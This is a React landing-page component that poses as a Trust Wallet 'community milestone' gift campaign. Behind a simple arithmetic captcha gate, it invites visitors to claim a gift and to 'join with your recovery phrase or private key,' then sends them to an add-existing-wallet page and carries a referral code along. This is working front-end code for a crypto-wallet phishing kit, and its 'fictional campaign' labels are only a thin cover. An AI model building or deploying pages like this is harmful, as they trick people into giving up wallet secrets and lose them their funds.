// LandingPage.jsx
import { IoChevronDown } from 'react-icons/io5'
import { useEffect, useRef, useState } from 'react'
import { useNavigate, useLocation } from 'react-router-dom'
import trustShield from '../../assets/trust-shield.png'

const CAPTCHA_STORAGE_KEY = 'truxhubline_captcha_verified_at'
const CAPTCHA_VALID_FOR_MS = 6 * 60 * 60 * 1000

const createChallenge = () => {
  const firstNumber = Math.floor(Math.random() * 8) + 2
  const secondNumber = Math.floor(Math.random() * 8) + 2

  return {
    prompt: `${firstNumber} + ${secondNumber}`,
    answer: firstNumber + secondNumber,
  }
}

const hasValidCaptcha = () => {
  try {
    const verifiedAt = Number(localStorage.getItem(CAPTCHA_STORAGE_KEY))
    const elapsed = Date.now() - verifiedAt
    return Number.isFinite(verifiedAt)
      && verifiedAt > 0
      && elapsed >= 0
      && elapsed < CAPTCHA_VALID_FOR_MS
  } catch {
    return false
  }
}

function LandingPage() {
  const navigate = useNavigate()
  const location = useLocation()
  const answerInputRef = useRef(null)
  const [isCaptchaVerified, setIsCaptchaVerified] = useState(hasValidCaptcha)
  const [challenge, setChallenge] = useState(createChallenge)
  const [answer, setAnswer] = useState('')
  const [captchaError, setCaptchaError] = useState('')
  
  // Capture and display referral on landing page
  useEffect(() => {
    const params = new URLSearchParams(location.search)
    const ref = params.get('ref')
    if (ref) {
      console.log('📢 Referral detected on landing:', ref)
      // Optionally show a welcome banner
    }
  }, [location])

  useEffect(() => {
    if (!isCaptchaVerified) {
      answerInputRef.current?.focus()
    }
  }, [isCaptchaVerified])

  const refreshChallenge = () => {
    setChallenge(createChallenge())
    setAnswer('')
    setCaptchaError('')
    answerInputRef.current?.focus()
  }

  const handleCaptchaSubmit = (event) => {
    event.preventDefault()

    if (Number(answer.trim()) !== challenge.answer) {
      setCaptchaError('That answer is not correct. Please try again.')
      setAnswer('')
      answerInputRef.current?.focus()
      return
    }

    try {
      localStorage.setItem(CAPTCHA_STORAGE_KEY, String(Date.now()))
    } catch {
      // Continue for this visit if browser storage is unavailable.
    }

    setCaptchaError('')
    setIsCaptchaVerified(true)
  }

  const handleConnectWallet = () => {
    // Preserve referral when navigating
    const params = new URLSearchParams(location.search)
    const ref = params.get('ref')
    const path = ref ? `/add-existing-wallet?ref=${ref}` : '/add-existing-wallet'
    navigate(path)
  }

  return (
    <main className="landing-page">
      <div
        className="landing-stage"
        aria-label="Fictional Trust Wallet community campaign"
        inert={!isCaptchaVerified ? '' : undefined}
      >
        <span className="landing-cursor landing-cursor-top" aria-hidden="true" />
        <span className="landing-cursor landing-cursor-side" aria-hidden="true" />

        <div className="landing-orbit" aria-hidden="true">
          <span className="landing-orbit-ring" />
          <img
            className="landing-shield landing-shield-primary"
            src={trustShield}
            alt=""
          />
        </div>
        <img
          className="landing-shield landing-shield-small"
          src={trustShield}
          alt=""
        />
        <img
          className="landing-shield landing-shield-tiny"
          src={trustShield}
          alt=""
        />

        <section className="landing-copy">
          <p>Fictional campaign concept.</p>
          <h1>Trust Wallet Community Milestone</h1>
          <span>
            A 220 million user appreciation moment focused on long-term community
            recognition, wallet security, and responsible Web3 participation.
          </span>
          <ul className="landing-points" aria-label="Campaign highlights">
            <li>Celebrate global community growth</li>
            <li>Claim Your own gift</li>
            <li>join with your recovery phrase or private key</li>
          </ul>
          <button type="button" onClick={handleConnectWallet}>
            Connect Wallet
          </button>
        </section>

        <div className="landing-next" aria-hidden="true">
          <IoChevronDown />
        </div>
      </div>

      {!isCaptchaVerified && (
        <div className="captcha-backdrop">
          <section
            className="captcha-card"
            role="dialog"
            aria-modal="true"
            aria-labelledby="captcha-title"
            aria-describedby="captcha-description"
          >
            <div className="captcha-badge" aria-hidden="true">✓</div>
            <p className="captcha-eyebrow">Security check</p>
            <h2 id="captcha-title">Confirm you’re human</h2>
            <p id="captcha-description">
              Solve this quick challenge to continue. You won’t be asked again
              for six hours on this device.
            </p>

            <form onSubmit={handleCaptchaSubmit} noValidate>
              <label htmlFor="captcha-answer">What is {challenge.prompt}?</label>
              <div className="captcha-answer-row">
                <input
                  ref={answerInputRef}
                  id="captcha-answer"
                  type="text"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  autoComplete="off"
                  value={answer}
                  onChange={(event) => {
                    setAnswer(event.target.value.replace(/\D/g, ''))
                    setCaptchaError('')
                  }}
                  aria-invalid={Boolean(captchaError)}
                  aria-describedby={captchaError ? 'captcha-error' : undefined}
                  placeholder="Your answer"
                />
                <button className="captcha-refresh" type="button" onClick={refreshChallenge}>
                  New question
                </button>
              </div>
              <p className="captcha-error" id="captcha-error" aria-live="polite">
                {captchaError}
              </p>
              <button className="captcha-submit" type="submit" disabled={!answer.trim()}>
                Verify &amp; continue
              </button>
            </form>
          </section>
        </div>
      )}
    </main>
  )
}

export default LandingPage
